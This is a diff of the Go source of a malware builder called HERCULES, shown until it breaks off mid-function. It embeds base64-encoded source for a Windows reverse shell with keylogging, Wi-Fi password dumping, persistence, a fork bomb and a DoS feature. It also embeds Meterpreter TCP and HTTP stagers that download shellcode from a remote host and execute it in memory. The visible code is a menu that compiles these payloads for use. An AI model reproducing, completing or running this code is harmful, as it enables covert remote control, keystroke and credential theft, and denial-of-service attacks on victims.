@@ -1,300 +1,793 @@
 package main
 
 
-
 import "strings"
 import "fmt"
 import "os"
-import "runtime"
+import "time"
+import "strconv"
+import "net/http"
 import "io/ioutil"
 import "os/exec"
-import "path/filepath"
 import "encoding/base64"
-import "github.com/fatih/color"
+import "color"
+
+
+const VERSION string = "3.0.0"
+
+var HERCULES_REVERSE_SHELL string = "cGFja2FnZSBtYWluCgppbXBvcnQgIm5ldCIKaW1wb3J0ICJvcy9leGVjIgppbXBvcnQgImJ1ZmlvIgppbXBvcnQgInN0cmluZ3MiCmltcG9ydCAic3lzY2FsbCIKaW1wb3J0ICJ0aW1lIgppbXBvcnQgIkVHRVNQTE9JVCIKCgoKY29uc3QgSVAgc3RyaW5nID0gIjEwLjEwLjEwLjg0Igpjb25zdCBQT1JUIHN0cmluZyA9ICI1NTU1IgoKY29uc3QgQkFDS0RPT1IgYm9vbCA9IGZhbHNlOwpjb25zdCBFTUJFRERFRCBib29sID0gZmFsc2U7CmNvbnN0IFRJTUVfREVMQVkgdGltZS5EdXJhdGlvbiA9IDU7Ly9TZWNvbmQKCmNvbnN0IEI2NF9CSU5BUlkgc3RyaW5nID0gIi8vSU5TRVJULUJJTkFSWS1IRVJFLy8iCmNvbnN0IEJJTkFSWV9OQU1FIHN0cmluZyA9ICJ3aW51cGR0LmV4ZSIKCnZhciBHTE9CQUxfQ09NTUFORCBzdHJpbmc7CnZhciBQQVJBTUVURVJTIHN0cmluZzsKdmFyIEtleUxvZ3Mgc3RyaW5nOwoKCgpmdW5jIG1haW4oKSB7CgoKICBpZiBFTUJFRERFRCA9PSB0cnVlIHsKICAgIEVHRVNQTE9JVC5EaXNwYXRjaChCNjRfQklOQVJZLCBCSU5BUllfTkFNRSwgUEFSQU1FVEVSUykKICB9CgoKICBpZiBCQUNLRE9PUiA9PSB0cnVlIHsKICAgIEVHRVNQTE9JVC5QZXJzaXN0ZW5jZSgpCiAgfQoKICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIElQKyI6IitQT1JUKTsKICBpZiBlcnIgIT0gbmlsIHsKICAgIHRpbWUuU2xlZXAoVElNRV9ERUxBWSp0aW1lLlNlY29uZCk7CiAgICBtYWluKCk7CiAgfTsKCgoKICBEaXIsIFZlcnNpb24sIFVzZXJuYW1lLCBBViA6PSBFR0VTUExPSVQuU3lzZ3VpZGUoKQogIFN5c0d1aWRlIDo9IChCQU5ORVIgKyAiIyBTWVNHVUlERVxuIiArICJ8IiArIHN0cmluZyhWZXJzaW9uKSArICJ8XG58XG5+PiBVc2VyIDogIiArIHN0cmluZyhVc2VybmFtZSkgKyAiXG58XG58XG5+PiBBViA6ICIgKyBzdHJpbmcoQVYpICArICJcblxuXG4iICsgc3RyaW5nKERpcikgKyAiPiIpCiAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpOwoKCgogIGZvciB7CgogICAgQ29tbWFuZCwgXyA6PSBidWZpby5OZXdSZWFkZXIoY29ubmVjdCkuUmVhZFN0cmluZygnXG4nKTsKICAgIF9Db21tYW5kIDo9IHN0cmluZyhDb21tYW5kKTsKICAgIEdMT0JBTF9DT01NQU5EID0gX0NvbW1hbmQ7CgoKCiAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBsZWFzZSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UExFQVNFIikgewogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShFR0VTUExPSVQuUGxlYXNlKEdMT0JBTF9DT01NQU5EKSkpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5NRVRFUlBSRVRFUiIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+bWV0ZXJwcmV0ZXIiKSB7CiAgICAgIFRlbXBfQWRkcmVzcyA6PSBzdHJpbmdzLlNwbGl0KF9Db21tYW5kLCAiXCIiKS8vfm1ldGVycHJldGVyIC0tdGNwICIxMjcuMC4wLjE6NDQ0NCIKICAgICAgQWRkcmVzcyA6PSBzdHJpbmcoVGVtcF9BZGRyZXNzWzFdKQogICAgICBDb25UeXBlIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICIgIikKICAgICAgQ29uVHlwZVsxXSA9IHN0cmluZ3MuVHJpbVByZWZpeChDb25UeXBlWzFdLCAiLS0iKQogICAgICBFR0VTUExPSVQuTWV0ZXJwcmV0ZXIoQ29uVHlwZVsxXSwgQWRkcmVzcykKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bK10gTWV0ZXJwcmV0ZXIgRXhlY3V0ZWQgIVxuXG4iK0RpcisiPiIpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+TUlHUkFURSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+bWlncmF0ZSIpIHsKICAgICAgVGVtcF9BZGRyZXNzIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICJcIiIpLy9+bWlncmF0ZSAiMTI3LjAuMC4xOjQ0NDQiIDEyMTIKICAgICAgQWRkcmVzcyA6PSBzdHJpbmcoVGVtcF9BZGRyZXNzWzFdKQogICAgICBQaWQgOj0gc3RyaW5ncy5TcGxpdChfQ29tbWFuZCwgIiAiKQogICAgICBSZXN1bHQsIEVycm9yIDo9IEVHRVNQTE9JVC5NaWdyYXRlKFBpZFsyXSwgQWRkcmVzcykKICAgICAgaWYgUmVzdWx0ID09IHRydWUgewogICAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bK10gU3VjY2VzZnVsbHkgTWlncmF0ZWQgIVxuXG4iK0RpcisiPiIpKTsKICAgICAgfWVsc2V7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG4iK0Vycm9yKyJcblxuIitEaXIrIj4iKSk7CiAgICAgIH0KICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+RE9TIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kb3MiKSB7CiAgICAgIERPU19Db21tYW5kIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpCiAgICAgIHZhciBET1NfVGFyZ2V0IHN0cmluZyA9ICBET1NfQ29tbWFuZFsxXQogICAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKHN0cmluZyhET1NfVGFyZ2V0KSwgImh0dHAiKSB7CiAgICAgICAgZ28gRUdFU1BMT0lULkRvcyhET1NfVGFyZ2V0KTsKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsqXSBTdGFydGluZyBET1MgYXRhY2suLi4iKyJcblxuWypdIFNlbmRpbmcgMTAwMCByZXF1ZXN0IHRvICIrRE9TX1RhcmdldCsiICFcblxuIitEaXIrIj4iKSk7CiAgICAgIH1lbHNlewogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWy1dIEVSUk9SOiBJbnZhbGlkIHVybCAhXG5cbiIrRGlyKyI+IikpOwogICAgICB9CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRJU1RSQUNUIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kaXN0cmFjdCIpIHsKICAgICAgRUdFU1BMT0lULkRpc3RyYWNrdCgpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5LRVlMT0dHRVItREVQTE9ZIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5rZXlsb2dnZXItZGVwbG95IikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5LZXlsb2dnZXItRGVwbG95Iil7CiAgICAgIGdvIEVHRVNQTE9JVC5LZXlsb2dnZXIoJktleUxvZ3MpOwogICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKCJcblsqXSBLZXlsb2dnZXIgZGVwbG95IGNvbXBsZXRlZFxuIiArICJcbiIgKyBzdHJpbmcoRGlyKSArICI+IikpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+S0VZTE9HR0VSLURVTVAiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmtleWxvZ2dlci1kdW1wIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5LZXlsb2dnZXItRHVtcCIpewogICAgICBEdW1wX091dHB1dCA6PSBzdHJpbmcoIiMjIyMjIyMjIyMjIyMjIyMjIyBLRVlMT0dHRVIgRFVNUCAjIyMjIyMjIyMjIyMjIyMjIyMiICsgIlxuXG4iICsgc3RyaW5nKEtleUxvZ3MpICsgIlxuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyIgKyAiXG4iK3N0cmluZyhEaXIpKyI+Iik7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKER1bXBfT3V0cHV0KSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifldJRkktTElTVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+d2lmaS1saXN0IikgewogICAgICBMaXN0IDo9IEVHRVNQTE9JVC5XaWZpTGlzdCgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoTGlzdCkpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+SEVMUCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+aGVscCIpIHsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKEhFTFArRGlyKyI+IikpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UEVSU0lTVEVOQ0UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBlcnNpc3RlbmNlIikgewogICAgICBnbyBFR0VTUExPSVQuUGVyc2lzdGVuY2UoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bKl0gQWRkaW5nIHBlcnNpc3RlbmNlIHJlZ2lzdHJpZXMuLi5cblsqXSBQZXJzaXN0ZW5jZSBDb21wbGV0ZWRcblxuIiArIHN0cmluZyhEaXIpICsiPiIpKTsKICAgIH1lbHNlewogICAgICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBfQ29tbWFuZCk7CiAgICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgICBvdXQsIF8gOj0gY21kLk91dHB1dCgpOwogICAgICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoIlxuXG4iK3N0cmluZyhvdXQpKyJcbiIrc3RyaW5nKERpcikrIj4iKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoQ29tbWFuZF9PdXRwdXQpKTsKICAgIH07CiAgfTsKfTsKCgoKCgoKdmFyIEJBTk5FUiBzdHJpbmcgPSBgCiAgICAgICAgICAgICAgICAgIF9fICBfX19fX19fX19fX18gIF9fX19fX19fICBfX19fICAgIF9fX19fX19fX19fCiAgICAgICAgICAgICAgICAgLyAvIC8gLyBfX19fLyBfXyBcLyBfX19fLyAvIC8gLyAvICAgLyBfX19fLyBfX18vCiAgICAgICAgICAgICAgICAvIC9fLyAvIF9fLyAvIC9fLyAvIC8gICAvIC8gLyAvIC8gICAvIF9fLyAgXF9fIFwKICAgICAgICAgICAgICAgLyBfXyAgLyAvX19fLyBfLCBfLyAvX19fLyAvXy8gLyAvX19fLyAvX19fIF9fXy8gLwogICAgICAgICAgICAgIC9fLyAvXy9fX19fXy9fLyB8X3xcX19fXy9cX19fXy9fX19fXy9fX19fXy8vX19fXy8KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEhFUkNVTEVTIFJFVkVSU0UgU0hFTEwgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpgCgoKCgp2YXIgSEVMUCBzdHJpbmcgPSBgCgogICAgICAgICAgICAgICAgICBfXyAgX19fX19fX19fX19fICBfX19fX19fXyAgX19fXyAgICBfX19fX19fX19fXwogICAgICAgICAgICAgICAgIC8gLyAvIC8gX19fXy8gX18gXC8gX19fXy8gLyAvIC8gLyAgIC8gX19fXy8gX19fLwogICAgICAgICAgICAgICAgLyAvXy8gLyBfXy8gLyAvXy8gLyAvICAgLyAvIC8gLyAvICAgLyBfXy8gIFxfXyBcCiAgICAgICAgICAgICAgIC8gX18gIC8gL19fXy8gXywgXy8gL19fXy8gL18vIC8gL19fXy8gL19fXyBfX18vIC8KICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBIRVJDVUxFUyBSRVZFUlNFIFNIRUxMICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCgp+UEVSU1NJU1RFTkNFICAgICAgICAgICAgICAgICAgICAgICAgIEluc3RhbGxzIGEgcGVyc2lzdGVuY2UgbW9kdWxlIGZvciBjb250aW5pb3VzIGFjY2VzCgp+RElTVFJBQ1QgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV4ZWN1dGVzIGEgZm9yayBib21iIGJhdCBmaWxlIGZvciBkaXN0cmFjdGlvbgoKflBMRUFTRSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBc2tzIHVzZXJzIGNvbWZpcm1hdGlvbiBmb3IgaGlnaGVyIHByaXZpbGlkZ2Ugb3BlcmF0aW9ucwoKfkRPUyAtQSAid3d3LnRhcmdldHNpdGUuY29tIiAgICAgICAgICBTdGFydHMgYSBkZW5pYWwgb2Ygc2VydmljZSBhdGFjawoKfldJRkktTElTVCAJCQkJCQkgICAgICAgICAgICAgICAgRHVtcHMgYWxsIHdpZmkgaGlzdG9yeSBkYXRhIHdpdGggcGFzc3dvcmRzCgp+TUVURVJQUkVURVIgLS1odHRwICIxMC4wLjAuMTo0NDQ0IiAgIENyZWF0ZXMgYSBtZXRlcnByZXRlciBjb25uZWN0aW9uIHRvIG1ldGFzcGxvaXQgKGh0dHAvaHR0cHMvdGNwKQoKfktFWUxPR0dFUi1ERVBMT1kgICAgICAgICAgICAgICAgICAgICBJbnN0YWxscyBhIGtleWxvZ2dlciBtb2R1bGUgYW5kIGxvZ3MgYWxsIGtleXN0cm9rZXMKCn5LRVlMT0dHRVItRFVNUCAgICAgICAgICAgICAgICAgICAgICAgRHVtcHMgYWxsIGxvZ2VkIGtleXN0cm9rZXMKCn5NSUdSQVRFICIxMC4wLjAuMTo0NDQ0IiAyMjIyICAgICAgICAgQ3JlYXRlcyBhIHJldmVyc2UgaHR0cCBtZXRlcnByZXRlciBzZXNzaW9uIGF0IGdpdmVuIHBpZCAoRVhQRVJJTUVOVEFMKQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpgCg=="
+var METERPRETER_TCP string = "cGFja2FnZSBtYWluCgoKaW1wb3J0ICJlbmNvZGluZy9iaW5hcnkiCmltcG9ydCAic3lzY2FsbCIKaW1wb3J0ICJ1bnNhZmUiCmltcG9ydCAiRUdFU1BMT0lUL1JTRSIKCmNvbnN0IE1FTV9DT01NSVQgID0gMHgxMDAwCmNvbnN0IE1FTV9SRVNFUlZFID0gMHgyMDAwCmNvbnN0IFBBR0VfQWxsb2NhdGVVVEVfUkVBRFdSSVRFICA9IDB4NDAKCgp2YXIgSzMyID0gc3lzY2FsbC5OZXdMYXp5RExMKCJrZXJuZWwzMi5kbGwiKQp2YXIgVmlydHVhbEFsbG9jID0gSzMyLk5ld1Byb2MoIlZpcnR1YWxBbGxvYyIpCgoKZnVuYyBBbGxvY2F0ZShTaGVsbGNvZGUgdWludHB0cikgKHVpbnRwdHIpIHsKCglBZGRyLCBfLCBfIDo9IFZpcnR1YWxBbGxvYy5DYWxsKDAsIFNoZWxsY29kZSwgTUVNX1JFU0VSVkV8TUVNX0NPTU1JVCwgUEFHRV9BbGxvY2F0ZVVURV9SRUFEV1JJVEUpCglpZiBBZGRyID09IDAgewoJCW1haW4oKQoJfQoJcmV0dXJuIEFkZHIKfQoKZnVuYyBtYWluKCkgewoJLy9SU0UuUGVyc2lzdGVuY2UoKQoJdmFyIFdTQV9EYXRhIHN5c2NhbGwuV1NBRGF0YQoJc3lzY2FsbC5XU0FTdGFydHVwKHVpbnQzMigweDIwMiksICZXU0FfRGF0YSkKCVNvY2tldCwgXyA6PSBzeXNjYWxsLlNvY2tldChzeXNjYWxsLkFGX0lORVQsIHN5c2NhbGwuU09DS19TVFJFQU0sIDApCglTb2NrZXRfQWRkciA6PSBzeXNjYWxsLlNvY2thZGRySW5ldDR7UG9ydDogNTU1NSwgQWRkcjogWzRdYnl0ZXsxMjcsMCwwLDF9fQoJc3lzY2FsbC5Db25uZWN0KFNvY2tldCwgJlNvY2tldF9BZGRyKQoJdmFyIExlbmd0aCBbNF1ieXRlCglXU0FfQnVmZmVyIDo9IHN5c2NhbGwuV1NBQnVme0xlbjogdWludDMyKDQpLCBCdWY6ICZMZW5ndGhbMF19CglVaXRuWmVyb18xIDo9IHVpbnQzMigwKQoJRGF0YVJlY2VpdmVkIDo9IHVpbnQzMigwKQoJc3lzY2FsbC5XU0FSZWN2KFNvY2tldCwgJldTQV9CdWZmZXIsIDEsICZEYXRhUmVjZWl2ZWQsICZVaXRuWmVyb18xLCBuaWwsIG5pbCkKCUxlbmd0aF9pbnQgOj0gYmluYXJ5LkxpdHRsZUVuZGlhbi5VaW50MzIoTGVuZ3RoWzpdKQoJaWYgTGVuZ3RoX2ludCA8IDEwMCB7CgkJbWFpbigpCgl9CglTaGVsbGNvZGVfQnVmZmVyIDo9IG1ha2UoW11ieXRlLCBMZW5ndGhfaW50KQoKCXZhciBTaGVsbGNvZGUgW11ieXRlCglXU0FfQnVmZmVyID0gc3lzY2FsbC5XU0FCdWZ7TGVuOiBMZW5ndGhfaW50LCBCdWY6ICZTaGVsbGNvZGVfQnVmZmVyWzBdfQoJVWl0blplcm9fMSA9IHVpbnQzMigwKQoJRGF0YVJlY2VpdmVkID0gdWludDMyKDApCglUb3RhbERhdGFSZWNlaXZlZCA6PSB1aW50MzIoMCkKCWZvciBUb3RhbERhdGFSZWNlaXZlZCA8IExlbmd0aF9pbnQgewoJCXN5c2NhbGwuV1NBUmVjdihTb2NrZXQsICZXU0FfQnVmZmVyLCAxLCAmRGF0YVJlY2VpdmVkLCAmVWl0blplcm9fMSwgbmlsLCBuaWwpCgkJZm9yIGkgOj0gMDsgaSA8IGludChEYXRhUmVjZWl2ZWQpOyBpKysgewoJCQlTaGVsbGNvZGUgPSBhcHBlbmQoU2hlbGxjb2RlLCBTaGVsbGNvZGVfQnVmZmVyW2ldKQoJCX0KCQlUb3RhbERhdGFSZWNlaXZlZCArPSBEYXRhUmVjZWl2ZWQKCX0KCglBZGRyIDo9IEFsbG9jYXRlKHVpbnRwdHIoTGVuZ3RoX2ludCArIDUpKQoJQWRkclB0ciA6PSAoKls5OTAwMDBdYnl0ZSkodW5zYWZlLlBvaW50ZXIoQWRkcikpCglTb2NrZXRQdHIgOj0gKHVpbnRwdHIpKHVuc2FmZS5Qb2ludGVyKFNvY2tldCkpCglBZGRyUHRyWzBdID0gMHhCRgoJQWRkclB0clsxXSA9IGJ5dGUoU29ja2V0UHRyKQoJQWRkclB0clsyXSA9IDB4MDAKCUFkZHJQdHJbM10gPSAweDAwCglBZGRyUHRyWzRdID0gMHgwMAoJZm9yIEJwdUFLckp4ZmwsIElJbmdhY01hQmggOj0gcmFuZ2UgU2hlbGxjb2RlIHsKCQlBZGRyUHRyW0JwdUFLckp4ZmwrNV0gPSBJSW5nYWNNYUJoCgl9CgkvL1JTRS5NaWdyYXRlKEFkZHIsIExlbmd0aF9pbnQpCglzeXNjYWxsLlN5c2NhbGwoQWRkciwgMCwgMCwgMCwgMCkKfQoKLyoKCjEuIENyZWF0ZSBXU0EgREFUQSB2ZXJzaW9uIDIuMgoyLiBDcmVhdGUgYSBXU0EgU29ja2V0CjMuIENyZWF0ZSBXU0EgU29ja2V0IEFkZHJlc3Mgb2JqZWN0CjQuIENvbm5lY3QKNS4gQ3JlYXRlIDQgYnl0ZSBzZWNvbmQgc3RhZ2UgbGVuZ3RoIGFycmF5CjYuIENyZWF0ZSBhIFdTQSBCdWZmZXIgb2JqZWN0IHBvaW50aW5nIHNlY29uZCBzdGFnZSBsZW5ndGggYXJyYXkKNy4gUmVjZWl2ZSA0IGJ5dGVzIFdTQVJlY3YgdG8gc2Vjb25kIHN0YWdlIGxlbmd0aCBhcnJheQo4LiBDb252ZXJ0IHNlY29uZCBzdGFnZSBsZW5ndGggdG8gaW50CjkuIENyZWF0ZSBhIGJ5dGUgYXJyYXkgYXQgdGhlIHNpemUgb2Ygc2Vjb25kIHN0YWdlIGJ5dGUgYXJyYXkgZm9yIHNlY29uZCBzdGFnZSBzaGVsbGNvZGUKMTAuIENyZWF0ZSBhIHVuZGVmaW5lZCBieXRlIGFycmF5CjExLiBDcmVhdGUgYW5vdGhlciBXU0EgYnVmZmVyIG9iamVjdCBwb2ludGluZyBhdCBzZWNvbmQgc3RhZ2Ugc2hlbGxjb2RlIGJ5dGUgYXJyYXkKMTIuIENvbnN0cnVjdCBhIG5lc3RlZCBmb3IgbG9vcCB0aGF0IHJlY2VpdmVzIGJ5dGVzIGFuZCBhcHBlbmRzIHRoZW0gaW50byB1bmRlZmluZWQgYnl0ZSBhcnJheQoxMy4gQWxsb2NhdGUgc3BhY2UgaW4gbWVtb3J5IGF0IHRoZSBzaXplIG9mIChzZWNvbmQgc3RhZ2Ugc2hlbGxjb2RlICsgNSkKMTQuIENyZWF0ZSBhIHBvaW50ZXIgdGhhdCBwb2ludHMgdG8gV1NBIFNvY2tldAoxNS4gQXNzaW5nIDB4QkYobW92IGVkaSkgdG8gZmlzdCBieXRlIG9mIGFsbG9jYXRlZCBtZW1vcnkKMTYuIEFzc2luZyBXU0EgU29ja2V0IHBvaW50ZXIgdG8gc2Vjb25kIGJ5dGUgb2YgYWxsb2NhdGVkIG1lbW9yeQoxNy4gQXNzaW5nIHRyZWUgbnVsbCBieXRlcyBhZnRlciBzZWNvbmQgYnl0ZSBvZiBhbGxvY2F0ZWQgbWVtb3J5CjE4LiBNb3ZlIHNoZWxsY29kZSBieXRlcyB0byBhbGxvY2F0ZWQgbWVtb3J5IHN0YXJ0aW5nIGF0IGZpZnQgYnl0ZQoxOS4gTWFrZSBhIHN5c2NhbGwgdG8gYWxsb2NhdGVkIG1lbW9yeSBhZGRyZXNzCiovCg=="
+var METERPRETER_HTTP_HTTPS string = "cGFja2FnZSBtYWluCgppbXBvcnQgIm5ldC9odHRwIgppbXBvcnQgInN5c2NhbGwiCmltcG9ydCAidW5zYWZlIgppbXBvcnQgImlvL2lvdXRpbCIKLy9pbXBvcnQgIkVHRVNQTE9JVC9SU0UiCgoKCmNvbnN0IE1FTV9DT01NSVQgID0gMHgxMDAwCmNvbnN0IE1FTV9SRVNFUlZFID0gMHgyMDAwCmNvbnN0IFBBR0VfQWxsb2NhdGVVVEVfUkVBRFdSSVRFICA9IDB4NDAKCnZhciBLMzIgPSBzeXNjYWxsLk5ld0xhenlETEwoImtlcm5lbDMyLmRsbCIpCnZhciBWaXJ0dWFsQWxsb2MgPSBLMzIuTmV3UHJvYygiVmlydHVhbEFsbG9jIikKdmFyIEFkZHJlc3Mgc3RyaW5nID0gImh0dHA6Ly8xMjcuMC4wLjE6ODA4MC8iCnZhciBDaGVja3N1bSBzdHJpbmcgPSAiMTAyMDExYjd0eHBsNzFuIgoKCgpmdW5jIG1haW4oKSB7CiAgLy9SU0UuUGVyc2lzdGVuY2UoKQogIEFkZHJlc3MgKz0gQ2hlY2tzdW0KICBSZXNwb25zZSwgZXJyIDo9IGh0dHAuR2V0KEFkZHJlc3MpCiAgaWYgZXJyICE9IG5pbCB7CiAgICBtYWluKCkKICB9CiAgU2hlbGxjb2RlLCBfIDo9IGlvdXRpbC5SZWFkQWxsKFJlc3BvbnNlLkJvZHkpCgogIEFkZHIsIF8sIGVyciA6PSBWaXJ0dWFsQWxsb2MuQ2FsbCgwLCB1aW50cHRyKGxlbihTaGVsbGNvZGUpKSwgTUVNX1JFU0VSVkV8TUVNX0NPTU1JVCwgUEFHRV9BbGxvY2F0ZVVURV9SRUFEV1JJVEUpCiAgaWYgQWRkciA9PSAwIHsKICAgIG1haW4oKQogIH0KICBBZGRyUHRyIDo9ICgqWzk5MDAwMF1ieXRlKSh1bnNhZmUuUG9pbnRlcihBZGRyKSkKICBmb3IgaSA6PSAwOyBpIDwgbGVuKFNoZWxsY29kZSk7IGkrKyB7CiAgICBBZGRyUHRyW2ldID0gU2hlbGxjb2RlW2ldCiAgfQogIC8vUlNFLk1pZ3JhdGUoQWRkciwgbGVuKFNoZWxsY29kZSkpCiAgc3lzY2FsbC5TeXNjYWxsKEFkZHIsIDAsIDAsIDAsIDApCgp9Cg=="
+
+type PAYLOAD struct {
+  Ip string
+  Port string
+  Type int
+  Size string
+  UPX_Size string
+  MidSize string
+  FullSize string
+  Score float32
+  FileName string
+  SourceCode string
+  Persistence bool
+  Migrate bool
+  UPX bool
+
+}
+
+var Payload PAYLOAD
+var MenuSelection int
+var Ask string
+var NO int
 
 
 
-var ARG string
-var PAYLOAD string
-var PAYLOAD_TYPE string = "Windows"
-var PERSISTENCE bool
-var DISPATCH bool = false
-var ARC string = "386" 
-var LINKER string = "static"
+func main() {
+
+  Green := color.New(color.FgGreen)
+  BoldGreen := Green.Add(color.Bold)
+  Yellow := color.New(color.FgYellow)
+  BoldYellow := Yellow.Add(color.Bold)
+  Red := color.New(color.FgRed)
+  BoldRed := Red.Add(color.Bold)
 
 
+  Result := CheckSetup()
 
+  if Result == false {
+    ClearScreen()
+    PrintBanner()
+    PrintCredit()
 
+    BoldRed.Println("\n\n[!] HERCULES is not installed properly, please run setup.sh")
 
-func main() { // 192.168.1.1 8888 -p windows -a x86 -l static 
-
-
-  CheckGolang()
-
-
-  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
-  ARGS := os.Args[1:]
-
-
-
-  if len(ARGS) == 0 {
-    color.Yellow(HELP)
     os.Exit(1)
+
   }
 
-  if len(ARGS[0]) < 7 || len(ARGS[0]) > 15 {
-    color.Red("\n[-] ERROR : Invalid IP !")
-    os.Exit(1)
-  }
+  ClearScreen()
+  PrintBanner()
+  PrintCredit()
+  Menu_1()
 
-  if len(ARGS[1]) < 1 || len(ARGS[1]) > 5 {
-    color.Red("\n[-] ERROR : Invalid Port !")
-    os.Exit(1)
-  }
+  fmt.Scan(&MenuSelection)
 
-  for i := 0; i < len(ARGS); i++ {
-    if i == 0 {
-      ARG = ARGS[i]
+  ClearScreen()
+
+  if MenuSelection == 1 {
+    PrintBanner()
+    PrintPayloads()
+    fmt.Print("\n\n[*] Select : ")
+    fmt.Scan(&NO)
+    PreparePayload(NO)
+
+    fmt.Print("\n\n[*] Enter the base name for output files : ")
+    fmt.Scan(&Payload.FileName)
+    CompilePayload()
+    AskUPX()
+    FinalView()
+  }else if MenuSelection == 2 {
+    ClearScreen()
+    PrintBanner()
+    PrintCredit()
+    BoldRed.Println("\n\n[!] Bind payload option will be added at next version...")
+    time.Sleep(3*time.Second)
+    main()
+  }else if MenuSelection == 3 {
+    ClearScreen()
+    PrintBanner()
+    PrintCredit()
+    fmt.Println("\n\n")
+    Result := ChecVersion()
+    if strings.Contains(Result, "[!]") {
+      BoldRed.Println(Result)
+      if Result == "[!] New version detected" {
+        BoldYellow.Print("\nDo you want to upgrade ? (y/n) : ")
+        fmt.Scan(&Ask)
+        if Ask == "y" || Ask == "Y" {
+          Update := exec.Command("sh", "-c", "chmod 777 UPDATE && ./UPDATE")
+          Update.Stdout = os.Stdout
+          Update.Start()
+          os.Exit(1)
+        }else{
+          main()
+        }
+      }
     }else{
-      ARG = (ARG +" "+ ARGS[i])
+      BoldGreen.Println(Result)
     }
-  }
-
-  if strings.Contains(ARG, "-a x86") || strings.Contains(ARG, "-A X86") || strings.Contains(ARG, "-A x86") || strings.Contains(ARG, "-a X86") {
-    ARC = "386"
-  }else if strings.Contains(ARG, "-a x64") || strings.Contains(ARG, "-A X64") || strings.Contains(ARG, "-a X64") || strings.Contains(ARG, "-A x64") {
-    ARC = "amd64"
-  }else if strings.Contains(ARG, "-a") || strings.Contains(ARG, "-A") {
-    color.Red("\n[-] ERROR : Invalid Architecture !")
-    os.Exit(1)
-  }
-
- if  strings.Contains(ARG, "-l static") || strings.Contains(ARG, "-L STATIC") || strings.Contains(ARG, "-l STATIC") || strings.Contains(ARG, "-L static") {
-  LINKER =  "static"
